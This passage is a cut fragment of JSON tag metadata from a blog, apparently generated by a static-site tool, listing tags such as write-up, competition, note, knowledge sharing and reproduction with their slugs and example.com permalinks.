up","slug":"write-up","permalink":"http://example.com/tags/write-up/"},{"name":"比赛","slug":"比赛","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"},{"name":"note","slug":"note","permalink":"http://example.com/tags/note/"},{"name":"知识分享","slug":"知识分享","permalink":"http://example.com/tags/%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/"},{"name":"复现","slug":"复现","permalink":"http://example.com/tags/%E5%A4%8D%E7%8E%B0/"}]}